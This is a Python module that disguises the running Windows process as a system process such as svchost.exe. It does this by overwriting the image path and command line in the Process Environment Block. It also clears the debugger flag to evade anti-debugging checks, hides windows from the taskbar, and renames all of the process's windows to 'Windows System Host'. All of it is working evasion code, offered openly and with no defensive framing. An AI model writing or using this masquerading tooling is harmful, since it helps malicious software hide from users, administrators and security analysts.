"""
Process masking module - disguise the current process as a system process.

This module modifies the Process Environment Block (PEB) to change how the 
process appears in Task Manager and other tools.

Techniques:
1. Modify ImagePathName in PEB - changes the displayed executable path
2. Modify CommandLine in PEB - changes the displayed command line
3. Window title modification - changes visible window titles

Note: This is user-mode masking and won't fool kernel-level analysis tools.
"""
from __future__ import annotations

import ctypes
import logging
import os
import platform
import random
from typing import Optional

logger = logging.getLogger(__name__)

# Common system processes to masquerade as
SYSTEM_PROCESSES = [
    ("svchost.exe", "C:\\Windows\\System32\\svchost.exe", "-k netsvcs -p"),
    ("RuntimeBroker.exe", "C:\\Windows\\System32\\RuntimeBroker.exe", "-Embedding"),
    ("dllhost.exe", "C:\\Windows\\System32\\dllhost.exe", "/Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}"),
    ("conhost.exe", "C:\\Windows\\System32\\conhost.exe", "0x4"),
    ("SearchIndexer.exe", "C:\\Windows\\System32\\SearchIndexer.exe", "/Embedding"),
    ("smartscreen.exe", "C:\\Windows\\System32\\smartscreen.exe", "-Embedding"),
    ("SecurityHealthService.exe", "C:\\Windows\\System32\\SecurityHealthService.exe", ""),
    ("WmiPrvSE.exe", "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe", "-Embedding"),
    ("taskhostw.exe", "C:\\Windows\\System32\\taskhostw.exe", "{222A245B-E637-4AE9-A93F-A59CA119A75E}"),
    ("sihost.exe", "C:\\Windows\\System32\\sihost.exe", ""),
]

# Store original values for restoration
_original_image_path: Optional[str] = None
_original_command_line: Optional[str] = None
_masking_active: bool = False


class UNICODE_STRING(ctypes.Structure):
    """Windows UNICODE_STRING structure."""
    _fields_ = [
        ("Length", ctypes.c_ushort),
        ("MaximumLength", ctypes.c_ushort),
        ("Buffer", ctypes.c_void_p),
    ]


class PROCESS_BASIC_INFORMATION(ctypes.Structure):
    """Windows PROCESS_BASIC_INFORMATION structure."""
    _fields_ = [
        ("Reserved1", ctypes.c_void_p),
        ("PebBaseAddress", ctypes.c_void_p),
        ("Reserved2", ctypes.c_void_p * 2),
        ("UniqueProcessId", ctypes.POINTER(ctypes.c_ulong)),
        ("Reserved3", ctypes.c_void_p),
    ]


class RTL_USER_PROCESS_PARAMETERS(ctypes.Structure):
    """Partial RTL_USER_PROCESS_PARAMETERS structure - fields we care about."""
    _fields_ = [
        ("Reserved1", ctypes.c_byte * 16),
        ("Reserved2", ctypes.c_void_p * 10),
        ("ImagePathName", UNICODE_STRING),
        ("CommandLine", UNICODE_STRING),
    ]


class PEB(ctypes.Structure):
    """Partial PEB structure - fields we care about."""
    _fields_ = [
        ("Reserved1", ctypes.c_byte * 2),
        ("BeingDebugged", ctypes.c_byte),
        ("Reserved2", ctypes.c_byte * 1),
        ("Reserved3", ctypes.c_void_p * 2),
        ("Ldr", ctypes.c_void_p),
        ("ProcessParameters", ctypes.POINTER(RTL_USER_PROCESS_PARAMETERS)),
    ]


def _get_peb_address() -> Optional[int]:
    """Get the address of the current process's PEB."""
    if platform.system() != "Windows":
        return None
    
    try:
        ntdll = ctypes.windll.ntdll
        kernel32 = ctypes.windll.kernel32
        
        # Get current process handle
        process_handle = kernel32.GetCurrentProcess()
        
        # Query process information
        pbi = PROCESS_BASIC_INFORMATION()
        return_length = ctypes.c_ulong()
        
        status = ntdll.NtQueryInformationProcess(
            process_handle,
            0,  # ProcessBasicInformation
            ctypes.byref(pbi),
            ctypes.sizeof(pbi),
            ctypes.byref(return_length),
        )
        
        if status != 0:
            logger.debug("NtQueryInformationProcess failed with status: 0x%x", status)
            return None
        
        return pbi.PebBaseAddress
    except Exception as e:
        logger.debug("Failed to get PEB address: %s", e)
        return None


def _read_unicode_string(us: UNICODE_STRING) -> Optional[str]:
    """Read a UNICODE_STRING value."""
    if not us.Buffer or us.Length == 0:
        return None
    try:
        return ctypes.wstring_at(us.Buffer, us.Length // 2)
    except Exception:
        return None


def _write_unicode_string(us: UNICODE_STRING, new_value: str) -> bool:
    """Write a new value to a UNICODE_STRING buffer."""
    try:
        # Encode the new string
        encoded = new_value.encode('utf-16-le')
        new_length = len(encoded)
        
        # Check if it fits in the existing buffer
        if new_length > us.MaximumLength:
            logger.debug("New string too long for buffer (%d > %d)", new_length, us.MaximumLength)
            # Truncate to fit
            new_value = new_value[:us.MaximumLength // 2 - 1]
            encoded = new_value.encode('utf-16-le')
            new_length = len(encoded)
        
        # Write to the buffer
        ctypes.memmove(us.Buffer, encoded, new_length)
        
        # Update the length field
        us.Length = new_length
        
        return True
    except Exception as e:
        logger.debug("Failed to write UNICODE_STRING: %s", e)
        return False


def get_current_image_path() -> Optional[str]:
    """Get the current process image path from PEB."""
    if platform.system() != "Windows":
        return None
    
    try:
        peb_addr = _get_peb_address()
        if not peb_addr:
            return None
        
        peb = PEB.from_address(peb_addr)
        if not peb.ProcessParameters:
            return None
        
        params = peb.ProcessParameters.contents
        return _read_unicode_string(params.ImagePathName)
    except Exception as e:
        logger.debug("Failed to get image path: %s", e)
        return None


def get_current_command_line() -> Optional[str]:
    """Get the current command line from PEB."""
    if platform.system() != "Windows":
        return None
    
    try:
        peb_addr = _get_peb_address()
        if not peb_addr:
            return None
        
        peb = PEB.from_address(peb_addr)
        if not peb.ProcessParameters:
            return None
        
        params = peb.ProcessParameters.contents
        return _read_unicode_string(params.CommandLine)
    except Exception as e:
        logger.debug("Failed to get command line: %s", e)
        return None


def mask_process(
    target_name: str = "svchost.exe",
    target_path: Optional[str] = None,
    target_cmdline: Optional[str] = None,
) -> bool:
    """
    Mask the current process to appear as another process.
    
    Args:
        target_name: Name of the process to masquerade as (e.g., "svchost.exe")
        target_path: Full path to use (default: C:\\Windows\\System32\\{target_name})
        target_cmdline: Command line to display (default: typical for target process)
    
    Returns:
        True if masking was successful, False otherwise
    """
    global _original_image_path, _original_command_line, _masking_active
    
    if platform.system() != "Windows":
        logger.debug("Process masking only supported on Windows")
        return False
    
    if _masking_active:
        logger.debug("Process masking already active")
        return True
    
    try:
        peb_addr = _get_peb_address()
        if not peb_addr:
            logger.error("Failed to get PEB address")
            return False
        
        peb = PEB.from_address(peb_addr)
        if not peb.ProcessParameters:
            logger.error("ProcessParameters is NULL")
            return False
        
        params = peb.ProcessParameters.contents
        
        # Store original values
        _original_image_path = _read_unicode_string(params.ImagePathName)
        _original_command_line = _read_unicode_string(params.CommandLine)
        
        # Determine target values
        if target_path is None:
            target_path = f"C:\\Windows\\System32\\{target_name}"
        
        if target_cmdline is None:
            # Find matching cmdline from our list
            for name, path, cmdline in SYSTEM_PROCESSES:
                if name.lower() == target_name.lower():
                    target_cmdline = f'"{path}" {cmdline}'.strip()
                    break
            else:
                target_cmdline = f'"{target_path}"'
        
        # Apply masking
        success_path = _write_unicode_string(params.ImagePathName, target_path)
        success_cmd = _write_unicode_string(params.CommandLine, target_cmdline)
        
        if success_path and success_cmd:
            _masking_active = True
            logger.info("Process masked as: %s", target_name)
            return True
        else:
            logger.warning("Partial masking: path=%s, cmdline=%s", success_path, success_cmd)
            return success_path or success_cmd
        
    except Exception as e:
        logger.exception("Failed to mask process: %s", e)
        return False


def mask_as_random_system_process() -> bool:
    """Mask the process as a randomly selected system process."""
    target = random.choice(SYSTEM_PROCESSES)
    name, path, cmdline = target
    full_cmdline = f'"{path}" {cmdline}'.strip() if cmdline else f'"{path}"'
    return mask_process(name, path, full_cmdline)


def unmask_process() -> bool:
    """
    Restore the original process information.
    
    Returns:
        True if restoration was successful, False otherwise
    """
    global _original_image_path, _original_command_line, _masking_active
    
    if platform.system() != "Windows":
        return False
    
    if not _masking_active:
        logger.debug("Process masking not active")
        return True
    
    try:
        peb_addr = _get_peb_address()
        if not peb_addr:
            return False
        
        peb = PEB.from_address(peb_addr)
        if not peb.ProcessParameters:
            return False
        
        params = peb.ProcessParameters.contents
        
        # Restore original values
        success = True
        if _original_image_path:
            success = _write_unicode_string(params.ImagePathName, _original_image_path) and success
        if _original_command_line:
            success = _write_unicode_string(params.CommandLine, _original_command_line) and success
        
        if success:
            _masking_active = False
            _original_image_path = None
            _original_command_line = None
            logger.info("Process unmasked, original values restored")
        
        return success
    except Exception as e:
        logger.exception("Failed to unmask process: %s", e)
        return False


def is_masking_active() -> bool:
    """Check if process masking is currently active."""
    return _masking_active


def get_masking_status() -> dict:
    """Get detailed masking status."""
    return {
        "active": _masking_active,
        "original_path": _original_image_path,
        "original_cmdline": _original_command_line,
        "current_path": get_current_image_path(),
        "current_cmdline": get_current_command_line(),
    }


# Additional techniques

def hide_from_debugger() -> bool:
    """
    Set the BeingDebugged flag in PEB to 0.
    This can help evade simple anti-debugging checks.
    """
    if platform.system() != "Windows":
        return False
    
    try:
        peb_addr = _get_peb_address()
        if not peb_addr:
            return False
        
        peb = PEB.from_address(peb_addr)
        peb.BeingDebugged = 0
        logger.debug("BeingDebugged flag cleared")
        return True
    except Exception as e:
        logger.debug("Failed to clear BeingDebugged: %s", e)
        return False


def set_window_title(hwnd: int, new_title: str) -> bool:
    """Change the title of a window."""
    if platform.system() != "Windows":
        return False
    
    try:
        user32 = ctypes.windll.user32
        result = user32.SetWindowTextW(hwnd, new_title)
        return bool(result)
    except Exception as e:
        logger.debug("Failed to set window title: %s", e)
        return False


def hide_window_from_taskbar(hwnd: int) -> bool:
    """Hide a window from the taskbar."""
    if platform.system() != "Windows":
        return False
    
    try:
        user32 = ctypes.windll.user32
        
        GWL_EXSTYLE = -20
        WS_EX_TOOLWINDOW = 0x00000080
        WS_EX_APPWINDOW = 0x00040000
        
        # Get current extended style
        style = user32.GetWindowLongW(hwnd, GWL_EXSTYLE)
        
        # Remove APPWINDOW flag and add TOOLWINDOW flag
        new_style = (style | WS_EX_TOOLWINDOW) & ~WS_EX_APPWINDOW
        
        user32.SetWindowLongW(hwnd, GWL_EXSTYLE, new_style)
        logger.debug("Window hidden from taskbar")
        return True
    except Exception as e:
        logger.debug("Failed to hide window from taskbar: %s", e)
        return False


def mask_all_windows_titles(new_title: str = "Windows System Host") -> int:
    """
    Change the title of all windows belonging to the current process.
    
    Returns:
        Number of windows modified
    """
    if platform.system() != "Windows":
        return 0
    
    try:
        import ctypes.wintypes as wintypes
        
        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32
        
        current_pid = kernel32.GetCurrentProcessId()
        modified = 0
        
        WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HWND, wintypes.LPARAM)
        
        def enum_callback(hwnd: int, lparam: int) -> bool:
            nonlocal modified
            pid = wintypes.DWORD()
            user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            
            if pid.value == current_pid:
                if user32.IsWindowVisible(hwnd):
                    if set_window_title(hwnd, new_title):
                        modified += 1
            return True
        
        user32.EnumWindows(WNDENUMPROC(enum_callback), 0)
        logger.debug("Modified %d window titles", modified)
        return modified
    except Exception as e:
        logger.debug("Failed to mask window titles: %s", e)
        return 0


# Convenience function for full masking
def apply_full_masking(
    process_name: str = "svchost.exe",
    window_title: str = "Windows System Host",
    hide_debugger: bool = True,
) -> dict:
    """
    Apply all masking techniques at once.
    
    Args:
        process_name: System process to masquerade as
        window_title: Title for all windows
        hide_debugger: Whether to clear BeingDebugged flag
    
    Returns:
        Dictionary with results of each technique
    """
    results = {
        "process_masked": False,
        "windows_masked": 0,
        "debugger_hidden": False,
    }
    
    # Mask process name
    results["process_masked"] = mask_process(process_name)
    
    # Mask window titles
    results["windows_masked"] = mask_all_windows_titles(window_title)
    
    # Hide from debugger
    if hide_debugger:
        results["debugger_hidden"] = hide_from_debugger()
    
    logger.info("Full masking applied: %s", results)
    return results


def remove_full_masking() -> bool:
    """Remove all masking applied by apply_full_masking."""
    return unmask_process()
